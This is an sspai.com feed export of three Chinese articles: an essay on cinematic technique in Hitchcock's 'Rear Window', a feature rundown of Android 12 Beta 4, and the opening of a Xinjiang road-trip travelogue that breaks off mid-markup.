[{"title":"看什么 Café丨当我们聊「电影感」的时候，我们在聊些什么？","date":"2021-08-15 03:01:44","description":"\n<p>编者按：1895 年 12 月 28 日，在巴黎卡普辛路 14 号的大咖啡馆，历史上最著名的一场电影放映出现了 —— 卢米埃尔兄弟的一系列短片和其他演出一起成为了咖啡馆的助兴节目，而咖啡馆也正是那时人们谈论电影和艺术的重要场所。</p>\n<p>「看什么 Café」作为「本周看什么」栏目的衍生，就是想为热爱影视艺术的少数派们创造这样一个氛围，虽然我们无法回到电影诞生的那个年代，但我们依旧可以喝着咖啡，深入探讨有关影视艺术的一切。</p>\n<p>今天「看什么 Café」放送员电影专业的 <a href=\"https://sspai.com/u/d6sd0vwe\">@利兹与青鸟</a>，让我们来看看在 TA 的视角下「是什么造就了电影感」，而你心中的电影感又是什么呢？欢迎在评论区留言讨论，我们将抽取 1 条优质评论送上少数派周边一份 🎁！</p>\n<hr>\n<p>打开一个 VLOG，精致调色、酷炫剪辑，再加上电影遮幅，评论齐刷刷地夸赞电影感十足；搜索摄影教程，电影感滤镜、电影感调色种种技巧映入眼帘，似乎学会了就能一秒制造出大片。</p>\n<p>电影感这个词，和时尚圈里的高级感一样，作为日常出现频率高、人人追捧的形容词，一旦被使用，便带着一种与众不同的审美优越感。</p>\n<p>当我们在谈论「电影感」的时候，我们在谈论什么？</p>\n<p>电影作为一门独立的艺术，区别于其他艺术形式的独特之处，也就是所谓的「电影感」。什么是电影感？就是用电影特有的手法来讲述故事、表达情感、传递思想、激发观念。</p>\n<h2>希区柯克和他的《后窗》</h2>\n<p>主流的电影通常以叙事为主，在有限的时间里讲述故事。小说和戏剧讲述故事用的是语言，电影也不例外，电影所用的语言被称为视听语言，即镜头画面、声音、剪辑等，作为观众，我们无需想象故事的画面与声音，一切都将被呈现在眼前。</p>\n<p>一位导演用他毕生的作品完美地诠释了电影感这一概念，那就是希区柯克。一名电影制作者曾评价道：「希区柯克的电影，即使关掉所有声音，你依然能看懂故事，因为画面包含着一切信息。」</p>\n<p>在长达 60 年的艺术生涯中，希区柯克共拍摄了超过 50 部电影，在很多人眼中，他的名字就是悬疑与惊悚的代名词，但希区柯克却不止如此。从 1920 年代进入电影行业后，希区柯克拍摄了 9 部默片，在此后的导演生涯里，希区柯克一直将自己视为一位默片导演，并认为在某种程度上，有声片的诞生让电影丧失了影像叙事的纯粹感。在 1964 年一次访谈中，他说道：「现如今人们看到的大多数电影......仅仅是一些『会说话的照片』。这些电影与电影艺术没有任何关系。」</p>\n<p>在希区柯克拍摄的所有电影中，他认为《后窗》（Rear Window）最能展现电影艺术的本质。《后窗》上映于 1954 年，影片男主角杰弗里斯是一位摄影师，爱好冒险，由于一次拍摄事故摔伤左腿养病在家，每日坐于后窗，窥视对面各个窗口里住户的日常生活，以此作为消遣。在对其中一间窗户的窥视中，杰弗里斯发现一位卧病在床的女人经常与她的丈夫拉尔斯争执吵闹。在夫妻二人的又一次争吵后，杰夫注意到妻子消失了，丈夫拉尔斯行动可疑，因此杰弗里斯认为丈夫杀害了妻子。起初，杰弗里斯的女友丽莎、他的护士斯特拉以及他的警探朋友汤姆都不相信他的推测，因为并未找到实质的证据，但杰弗里斯越来越痴迷于证明谋杀案的真实性，而在找寻证据的过程中，杰弗里斯的处境渐渐变得危险。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/133f3f8490b33baac1cce00a6b2ff6b2.jpg\"><figcaption>《后窗》（Rear Window, 1954）</figcaption></figure><h2>纯影像叙事</h2>\n<p>希区柯克被认为是一位具有准确视觉感的导演，在他的电影中，几乎每一个画面都是提前设计好的，希区柯克擅长使用纯影像手法，来传递影片故事中的重要信息，运用镜头语言操纵观众的注意力、引发特定的期待、制造悬疑效果，观众被带入到角色的视角中，与角色一同直面危险与恐惧。《后窗》中，大部分场景是由同一个房间、一个位置、一个窥视窗外的角色构成的，作为一位懂得如何用画面讲故事的大师，即使故事被局限在封闭的空间里，希区柯克仍然用影像告诉观众所发生的一切。</p>\n<h3>用视觉手法传递信息</h3>\n<p>《后窗》的故事由一个长镜头开始，长镜头展示了杰弗里斯公寓窗外的住宅环境、显示着高温的温度表、不同楼层住户的行动，接着镜头转向窗前的杰弗里斯，他打着石膏的一条腿、桌上摔坏的相机、墙上的摄影作品、杂志封面照片。这是男主角杰弗里斯初次登场，希区柯克不使用任何旁白或对话来详细介绍人物经历，我们却能通过这个长镜头，轻易了解到他的职业、他受伤的原因。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/27b4599dec026e23d0d283183c7ba673.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/af1669e284ff5d3e8f4c0c95b85bfe65.jpg\" alt=\"\"></figure><figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/c54251ed130db49042ee06b101cc7474.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/ec4901cca220e31153e17d412e440535.jpg\" alt=\"\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/09/f7299a688ff762fb41113546f57f765c.jpg\"><figcaption>《后窗》（Rear Window, 1954）</figcaption></figure><p>对面窗户里的住户，希区柯克没有直接进入他们的公寓内部拍摄，拍摄角度一直位于杰弗里斯的后窗，限定在同一个位置，如同放映无声影片的窗口，这是一种挑战。但杰弗里斯的每一次窥视都不是多余的，通过多次窥视的景象，每扇窗户后面的人物形象更加鲜明，每个住户的行为组成一个完整的故事，由此呈现出一个小世界。</p>\n<p>当然，电影传递的信息是由影像与对话共同完成的，但即使是最普通的对话场景，也不仅仅是简单的你问我答，与之匹配的画面被精心设计，传递着更深层的信息。杰弗里斯与杂志社的朋友打电话时，通过对话中的信息，我们再次了解到杰弗里斯腿伤的原因、他对目前无聊生活的厌倦；与此同时，杰弗里斯窥视一扇扇窗户后的住户，镜头以杰弗里斯的视角拍摄了对面的住户：一位迷人的芭蕾舞女演员身穿胸罩短裤、迈着优美的舞步在房间里来回踱步；一名独居的男性钢琴家坐在钢琴前苦思冥想，创作曲子；最后，整部电影的焦点出现，镜头移动着拍摄了二楼公寓的两个窗口，推销员拉尔斯先生回到家中，卧病在床的妻子再次责备他，两人争吵起来。这些画面不只是作为对话的补充，还进一步说明了各楼层住户的性格，也为接下来即将发生的、影片的重头戏——谋杀故事做好了铺垫。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/babc6d3a3f4aeb36e5a02bcaa845bc83.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/9915211dab04c34f5ca691046226c735.jpg\" alt=\"\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/09/ae5a934e69fcab25196833e18f5b3f11.jpg\"><figcaption>《后窗》（Rear Window, 1954）</figcaption></figure><h3>主观视角的沉浸感</h3>\n<p>电影使用各种手法操纵着我们的视觉与听觉，塑造我们对世界的认知、我们的观念以及感受，这些手法中最基本的就是对叙事视角的选择。</p>\n<p>电影叙事的视角可分为两种——客观视角与主观视角。客观视角是大部分电影中最常见的视角，观众与影片中的人物隔着距离，客观视角是旁观式的、几乎不掺杂影片人物的情感，相当于文学作品中的第三人称，比如《群鸟》（The Birds, 1963）中，鸟儿袭击一位正在给车加油的男子，导致火灾发生后，一大群鸟聚集来到小镇，这个类似于上帝视角的俯瞰镜头：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/0b555c0afe5c606284d3d119aba7b503.jpg\"><figcaption>《群鸟》（The Birds, 1963）</figcaption></figure><p>主观视角则相当于文学作品中的第一人称，更容易调动观众的注意力、加深对剧情的参与度，主观镜头被称为 POV shot，POV 是 point-of-view 的缩写，意为视角、视点。主观镜头将摄影机置于人物的主观视点、模拟人物的双眼进行拍摄，电影通常将人物观看的动作、面部表情与该人物视角下看到的事物并列在一起，观众便能感受到人物的心理活动与情感波动，在《美人计》（Notorious, 1946）中，当女主角终于发现了自己正在被下毒时，她的主观镜头因此刻的心理感受而夸张化，将原本的景象变形：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/69b30f4675966f52e3c86d9477359e25.jpg\"><figcaption>《美人计》（Notorious, 1946）</figcaption></figure><p>在《头号玩家》里的VR游戏世界普及之前，你可以在希区柯克的电影中找到身临其境的沉浸感与代入感。希区柯克相信，电影可以运用视点的表现力，尤其是角色的主观视点，轻易操纵观众的认知，并在他的每一部电影中贯彻这个观念。</p>\n<p>与希区柯克合作过《辣手摧花》、《西北偏北》、《群鸟》、《艳贼》等电影的制片人罗伯特·博伊尔曾说过：「希区柯克是我合作过的导演中，唯一一个要求我们测量演员身高的导演，我们必须找出演员的视点位置有多高，从而令镜头的位置角度绝对正确。」</p>\n<p>在《后窗》中，希区柯克选择了男主角杰弗里斯的视点，让观众看到他所看到的一切，并在大部分时间里，限制观众只知道他所知道的事情。杰弗里斯被困在轮椅上，他的视线只能投向对面大楼各个窗户后的住户，而实际上，观众重复了他观看的行为，如同男主角，我们无法选择观看的角度，被置于男主角的视点，共享着他的视野，我们看见他观看的动作，看到了他所看到的一切，并体会到了他每一次观看后的心理感受，在危急时刻被困在原地时的无可奈何。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/5fb3efee008b61788362004780647ae3.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/0c280b86f926355e52591c4ee990d11b.jpg\" alt=\"\"></figure><figure class=\"ss-imgRows\" figcaption=\"《后窗》（Rear Window, 1954）\"><img src=\"https://cdn.sspai.com/2021/08/09/2b0b6242292c3b4bf2baaab433a3e0ad.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/5bd13ad4e4a9ca78698c5b7aeb72c149.jpg\" alt=\"\"></figure><h3>制造悬疑</h3>\n<p>希区柯克提出过一个著名的理论，他将悬疑比作「不能爆炸的炸弹」，并认为制造悬疑的戏剧效果远比营造惊奇的场面来得有趣。《希区柯克与特吕弗对话录》<sup class=\"ss-footnote\" href=\"\" title=\"Francois Truffaut, Hitchcock (New York: Simon and Schuster,1967), p52.\" footnote-id=\"1\">1</sup>一书中，希区柯克向法国导演弗朗索瓦·特吕弗解释何为悬疑：</p>\n<blockquote><p>像我们现在这样，正天南地北地聊天。假设桌下有一枚炸弹。起先没什么事发生， 然后，突然间「轰！」炸开了。观众吓了一跳，且在被吓到之前，平常得没有任 何特殊征兆。现在，换成悬疑的情境:观众知道桌下有炸弹，也许剧中已说明是 无政府主义的恐怖分子放的。观众知道炸弹在一点钟时会爆炸，壁炉上还有一个 钟，指针指出只剩 15 分钟了。然后，我们这样聊天就变得很有趣了，因为观众已投入剧情，会很想警告剧中人：「赶快停止聊这些芝麻绿豆大的事吧，桌下有 一枚炸弹要炸啦！」第一种爆炸情形，我们可以给观众 15 秒的惊吓效果。但在第二种情形，我们则提供了观众 15 分钟的悬疑。结论是，不管任何时候，观众 必须先知道究竟要发生什么事。</p></blockquote>\n<p>那么，如何用电影特有的手法制造悬疑情境呢？在必要的时候，希区柯克会改变视点，使用客观视点，允许观众在关键的时刻成为导演的同谋者，这个时候观众将会知道角色不知道的事情。《后窗》接近尾声时，拉尔斯最终发现了杰弗里斯正在调查自己，杰弗里斯从他的窗口转过身，而镜头展示了拉尔斯离开他的寓所。在这个关键的时刻，希区柯克不再使用杰弗里斯的主观视角，我们知道了额外的信息，开始担心杰弗里斯的安全，杰夫什么时候会发现我们已经知道的事情呢？悬疑效果由此产生。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/469abc75b103bcfac0c7df4629bf4898.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/4edb381a05a50afacea665ae2af3cc02.jpg\" alt=\"\"></figure><figure class=\"ss-imgRows\" figcaption=\"《后窗》（Rear Window, 1954）\"><img src=\"https://cdn.sspai.com/2021/08/09/e8c9da574a420848e1f18bea5272ff90.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/1ff642a886a936a3f0546fb76887fdd1.jpg\" alt=\"\"></figure><h2>剪辑的魔力</h2>\n<p>希区柯克乐于挑战、开拓电影各类艺术手法的可能性。他拍过全片由 10 个长镜头组成，通过隐性剪辑达到一镜到底效果的电影《夺魂索》（Rope，1948）；也在《惊魂记》（Psycho，1960）著名的浴室谋杀戏中，用 78 组机位，52 次剪接，呈现了快速剪辑带来的紧张感与惊悚感。</p>\n<p>电影剪辑的基本原理是将不同的镜头连接在一起，如同谱写一首乐曲，单个音符也许并无特别之处，但当音符连接、组合，便会产生特定的效果。苏联电影导演库里肖夫为了证明这一理论，曾进行了一次著名的剪辑实验，证明了剪辑可以赋予影像超越本身的意义，并且激发强烈的情感反应。</p>\n<p>库里肖夫将演员莫兹尤辛一个没有情绪的面部镜头，分别和一盆汤、一口躺着死者的棺材、一个美丽女子的镜头并列剪辑在一起，当观众看到这些剪辑在一起的镜头时，觉得莫兹尤辛分别表现出了饥饿、悲伤、愉悦的情绪。因此，库里肖夫认为引起观众情感反应的并不只是单个镜头的内容，而是多个镜头剪辑而成的结果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/6d229f322abcede4627542299a667190.png\"><figcaption>库里肖夫实验</figcaption></figure><p>《后窗》再次证明了库里肖夫实验的结论，希区柯克相信在电影制作过程中，利用剪辑将不同影像连接、整合，便可任意选择表现人物心理活动的方式，从而创造出无限的表现力。影片中出现最多的剪辑手法是男主角的观看内容与反应镜头交叉剪辑在一起，从肉眼到望远镜再到长焦摄影机，随着杰弗里斯观看的设备不断升级，我们如杰弗里斯一样，急切期望看见窗户后发生的故事，并对杰弗里斯的每一次反应感同身受。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/6180507a8c16ded93ff3a2280b66b370.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/991eef0c7e3baf99ecdbda3e81cb9fc2.jpg\" alt=\"\"></figure><figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/837099293a176c57762b1ecfa83c91e0.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/fbed9a813227ed1e875ff931b94335fc.jpg\" alt=\"\"></figure><figure class=\"ss-imgRows\" figcaption=\"《后窗》（Rear Window, 1954）\"><img src=\"https://cdn.sspai.com/2021/08/09/d29cdc6795934ffee31d2a81570bbfcf.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/09/64720287476fb7a3c309ac41d3b03d14.jpg\" alt=\"\"></figure><p>电影是关于时间与空间的艺术，电影创作者选择特定的空间，并通过剪辑手法自由支配镜头时间的长度，将重要的时刻延长，或将缓慢的时间加快。</p>\n<p>在《后窗》故事接近尾声时，当拉尔斯进入了杰弗里斯的房间，并朝着他一步步逼近，而杰弗里斯坐在轮椅上无法活动，只能打开摄像机的闪光灯扰乱对方的视线，这个段落里，希区柯克使用了较长时间的镜头，在杰弗里斯的动作、拉尔斯的反应之间来回剪切，短时间内的紧张感被无限延长。当杰夫即将被拉尔斯推下窗口时，紧张感到达了顶峰，希区柯克只选择拍下手、腿、脸部表情的特写镜头，并剪辑在一起，对于这一场景，希区柯克曾尝试过从远处拍下了一个连续完整的动作，但他并不满意，希区柯克解释：「面对面交锋的紧张时刻，剪辑的效果会更好，这让观众完全沉浸在影片的故事中，并成功地将他们卷入暴力情境。」</p>\n<h2>结语</h2>\n<p>希区柯克一直被看做是一位电影大师，一个视觉性的叙事者，他的电影中几乎每一个画面都承载着意义，无论是镜头画面、叙事手法、剪辑形式，希区柯克始终在革新电影这门新兴艺术的各种表现手法，挖掘着人内心深处的恐惧、执念、癖好，并证明了电影艺术无限的表现力和可能性。</p>\n<p>作为观众，在技术爆炸的今天，游戏、短视频、直播等娱乐形式日新月异，我们随时随地就能打开一个取悦自己的媒体，电影还是最具感染力的大众媒体吗？</p>\n<p>无论艺术的形式如何变迁，历史如何循环往复，能够被记住的一定是那些体现着「人」这一主体及其精神世界发展历程的作品，「电影感」的本质不在于高难度的炫技，而是技术背后创作者所想传递的一切信息、观念与情感。如马丁·斯科塞斯所说：「电影（cinema）讲的是『启示』—— 美学、情感和精神上的启示；讲的是『角色』—— 人的复杂性和他们充满反差、有时甚至自相矛盾的本性，他们会彼此伤害、彼此相爱，然后又突然直面自我。它是关于在银幕上、在那个被它戏剧化诠释出来的生活里，直面出乎意料的事情，并进一步拓宽这种艺术形式的可能性。」</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68175"},{"title":"具透 | 正式版进入倒计时：Android 12 Beta 4 更新细节速览","date":"2021-08-14 07:00:00","description":"\n<p>8 月 12 日凌晨，Google 如期放出了第 4 个 Android 12 测试版本（以下简称 Beta 4）。对开发者而言，Android 12 Beta 4 被 Google 官方定义为抵达「平台稳定性里程碑」，可能会影响应用的系统行为、非 SDK 接口限制都已经敲定，针对 Android 12 的兼容性适配工作自然也可以放心开展。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5v8db34tbhkbp54mg.png\"></figure><p>虽然从用户的角度来说这也意味着 Beta 4 可能没有太多功能和设计上的变化，但我们依然从中发掘到了不少值得关注的新细节。下面就请跟随本文一起来快速过一遍吧。</p>\n<h2>版本彩蛋正式上线</h2>\n<p>虽然没了对外的正式甜品代号，但 Android 一年一度的版本号彩蛋还是不能落下。</p>\n<p>Android 12 的版本彩蛋在 Beta 4 中正式上线，在「系统设置 &gt; 关于手机 &gt; Android 版本」中连续、快速点击 4 次「Android 版本」即可触发。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5v8lb34tbhkbp54n0.gif\"><figcaption>彩蛋交互</figcaption></figure><p>彩蛋主体是一个采用 Material You 设计语言的时钟，默认显示时间为当前的实际时间；交互方式则与 <a href=\"https://sspai.com/post/61957\" target=\"_blank\">Android 11 的彩蛋</a> 类似，可以用手随意拨动指针，拨动到正确的位置（当然是 12 点啦）就能触发第二段彩蛋。</p>\n<p>建议有密集恐惧症的朋友停留在第一层就好。</p>\n<h2>模糊定位功上线</h2>\n<p>Google 早就演示过、但在测试版中迟迟没有出现的模糊定位功能在 Beta 4 中算是正式上线了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5v8tb34tbhfir79d0.png\"><figcaption>定位选项</figcaption></figure><p>在此前的测试版本中我们仅能在应用权限设置界面中选择是否开启精准定位，Beta 4 则会在位置权限弹窗上方直接提供模糊定位与精确定位选项，整体设计和 iOS、MIUI 没有太大区别。</p>\n<h2>长截图可用性提升</h2>\n<p>Android 12 Beta 3 的长截图上线时虽然带来了一些惊喜，但彼时的长截图功能可用性实在一般，在使用非标准基础视图界面（View-based）的应用中几乎不可用。</p>\n<p>因此 Google 也承诺除了提供可供开发者适配的 ScrollCapture API 之外，Beta 4 中长截图功能还将默认支持更多功能和场景，包括对很多应用中都有运用的 ListView 的支持。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5v8tb34tbhj2tbvt0.png\"><figcaption>至少能截微信了</figcaption></figure><p>实测下来长截图也的确完善了不少 —— 至少在上个版本中完全用不了这个功能的微信在 Beta 4 中终于可以顺利截取聊天列表和聊天内容了。</p>\n<h2>更完善游戏功能</h2>\n<p>Android 12 中内置了一个类似「游戏助手」的游戏信息面板功能，全屏状态下从屏幕边缘呼出系统栏（状态栏、导航栏）即可看见屏幕右下角的入口图标。游戏信息中心提供了截图、录屏、FPS 显示、勿扰开关、YouTube 直播、游戏优化等等功能，相比定制系统中的各类游戏助手虽然基础了些，但对原生 Android 来说却是意义非凡（尤其是那个目前具体功能尚不明确的「优化」功能）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5v95b34tbhkbp54ng.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5v9db34tbhfir79dg.png\"><figcaption>游戏模式的常规触发方式与界面</figcaption></figure><p>或许是觉得触发方式比较繁琐，Beta 4 在「系统设置 &gt; 应用 &gt; 游戏设置」中新增了快捷方式开关，开启后游戏信息中心就会在我们进入游戏时默认以悬浮小图标或停靠在屏幕边缘的箭头图标常驻了，方便随时进行调用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5v9lb34tbhj2tbvtg.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5v9tb34tbhkbp54o0.png\"><figcaption>Beta 4 新增的浮窗按钮</figcaption></figure><h2>扒图、分享一气呵成</h2>\n<p>针对多任务界面的 OCR 信息提取，一直以来都是 Pixel 系列软件体验的出彩之处，无论是文本、图片还是 URL 链接，Android 系统围绕这一功能也在不停地做着改进。</p>\n<p>继 Beta 3 将对应任务中的 URL 链接提取为可点按分享的快捷图标后，Beta 4 现在还会对一些任务卡片上尺寸较大、较为明显的图片进行预处理，提供一个可以点击触发图片提取操作的小图标。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5va5b34tbhfir79e0.gif\"><figcaption>多任务一键扒图</figcaption></figure><p>触发图片操作后手机底部会出现分享对象建议，如果正好有你想要发送图片的对象，可以直接将多任务卡片上提取到的图片拖拽到下方并松开。因为可以无视应用内的图片保存限制，所以这个小功能用来扒图非常方便。看到好图时向上一推进入多任务界面就能马上保存下来，可以说是「图 fine 秒 mine（这图不错，是我的了）」的最佳实践工具了。</p>\n<h2>更多 Material You</h2>\n<p>Google 在 Pixel 系列手机上围绕 Material You 设计语言打造的 UI 也在日渐完善。在 Android 12 Beta 4 中，桌面搜索框的 Google 和麦克风图标现在也一扫过去的严肃、死板，可以自动套用壁纸提取到的颜色了。</p>\n<figure class=\"ss-imgRows\" figcaption=\"注意底部搜索框的图标颜色随壁纸的变化\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5valb34tbhfir79eg.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/13/24bd41456383f6bc20e500ca6e27d5fa.jpg\" alt=\"\"></figure><p>同时，系统设置中部分控件的视觉样式也在不断调整。除了修复此前一直存在的设置开关在深色主题下可见性较低的问题，Beta 4 还对一些遗留细节进行了翻新，比如带有动态演示设置项目，现在都会以圆角而非边到边的样式进行呈现了。</p>\n<figure class=\"ss-imgRows\" figcaption=\"旧样式（左）与新样式（右）\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5vb5b34tbhj2tbvug.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5vbdb34tbhkbp54og.png\" alt=\"\"></figure><h2>全局搜索正在路上</h2>\n<p>如果你在此前的测试版中尝试过来自社区开发者 kdrag0n 的 <a href=\"https://github.com/kdrag0n/android12-extensions\" target=\"_blank\">扩展模块</a>，会发现这个模块除了能够在 Beta 4 中解决应用抽屉顶部搜索框的视觉 bug，还能帮你顺便开启 Google 酝酿已久的全局搜索功能。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5vblb34tbhkbp54p0.png\"><figcaption>全局搜索</figcaption></figure><p>原生 Android 终于有了可以对标 Spotlight 的全局搜索功能。</p>\n<p>除了可以设置为打开应用抽屉自动弹出键盘外，全局搜索本身在 Beta 4 中也支持相当丰富的索引项目，包括应用快捷方式（App Shortcuts）、通讯录和对话消息联系人、设置项目、使用提示等。根据 Google 此前上线的 <a href=\"https://developer.android.com/reference/android/app/appsearch/AppSearchManager\" target=\"_blank\">文档</a>，全局搜索功能也能在第三方启动器中调用。</p>\n<h2>真正的彩蛋：Pixel 6 相机参数</h2>\n<p>除了上述大家已经能够通过 Pixel 机型尝鲜体验到细节，Beta 4 在代码中还藏了更加值得注意的小细节。</p>\n<p>知名 GCam 开发者 @<a href=\"https://twitter.com/Cstark_27/status/1425525856622063616\" target=\"_blank\">cstark</a> 通过拆包 Beta 4 预置的 Google Camera 发现，Google Pixel 6 的主摄像头将使用分辨率为 5000 万像素的三星 ISOCELL GN1 传感器；此外接下来要发布的 5 款 Pixel 机型中，其中 4 款都将采用三星 Exynos G5123B 型号的 5G 基带。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4b5vblb34tbhj2tbvv0.png\"><figcaption>gn1 为传感器型号，wide 为镜头规格，p21 即 2021 年的 Pixel 产品线</figcaption></figure><p>不出意外，市面上为数不多的 GN1 主摄机型，很快就能享受到全新的第三方 Google Camera 体验了，我们拭目以待。</p>\n<p><strong>关联阅读：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/67728\" target=\"_blank\">具透 | 原生长截图终于上线：Android 12 Beta 3 详解</a></li>\n<li><a href=\"https://sspai.com/post/68074\" target=\"_blank\">Google Pixel 6 系列提前官宣：6 个细节、6 种配色，还有很 6 的配置</a></li>\n</ul>\n<p><strong>参考链接：</strong><a href=\"https://mp.weixin.qq.com/s/N5rFOgCcLgf23HM2eYjHqA\" target=\"_blank\">平台稳定性里程碑 | Android 12 Beta 4 现已发布</a></p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68267"},{"title":"新疆 16 天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆","date":"2021-08-14 05:39:30","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>说在前面的话</h2>\n<p>新疆在我心里一直有一个遥远又向往的位置。也许是因为刘亮程的散文看多了，对新疆的文化和自然风光，一草一木一城一路一驴一山，有独特的归属感；也许是单纯向往着这一片天高草阔充满特殊风貌而又未曾抵达的自然乌托邦。过去几年虽一直未能成行，但一直期待着出发。今年 7 月初的时候，临时和老婆决定休婚假，凑了 16 天的假期，来一趟说走就走的新疆自驾之旅。</p>\n<p>计划 7 月 10 日从 北京 出发，7 月 25 日回京，主要游玩北疆的北线（喀纳斯、禾木）以及西线（伊犁周边）。因为物品还有行程安排准备的时间很紧，没有时间仔细规划，就快速的花了两三天时间从马蜂窝上参考了很多精彩的攻略，在高德上做好了路书，收拾好行囊，准时出发。</p>\n<p>（这几天因为疫情的原因， 北京以及全国多个城市去新疆的很多朋友被劝返了。天气原因很多景区和道路暂时关闭，建议大家出行前关注下各地和各个景区的政策。）</p>\n<p>16 天的行程下来， 新疆的美不在于某个景点或者某个众所周知的观景台，而在某一个山路的转角处，在某个小女孩跳舞的瞬间，在天空变幻莫测的云朵上，在牛羊早上的叫声中，在每个来过的人的眼睛中，在旅途结束后依旧萦绕在眼前的记忆里。</p>\n<p>要说遗憾，肯定是有的， 比如行程有点赶没有静下心品味美食和风土人情（所以图片没有任何吃的， 比如没有在山谷溪流边露营，没有进行一次深度的徒步之旅，不过这也正是下一次出行的契机哈哈。（补充一句，新疆是真的安全，可能是全国最安全的地方了。当然，安全也意味着严格，所以一定要带好身份证、驾照，遵守当地的防疫政策。）</p>\n<p>先来一波照片（按行程排序），拍了不少，可惜技术一般，只能拍拍定格的画面，拍不出大美新疆动态的壮阔和丰美。不过要点赞佳能相机内部可预设 jpeg 直出设置，很多照片不用单独后期处理，导出直接发朋友圈。图很多，建议配合导航栏阅读。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f2a34555ac5bdcc2fc46610f515792d9\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>G216 高速路景</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9b341e004398961a9002ab8b6d48d10e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>可可苏里花海</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/5898e1f422526957ca74220804a86ff3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>可可苏里花海</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/22c50dd4813a1680e42339c946b6ffab\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>可可苏里花海</figcaption></figure><figure 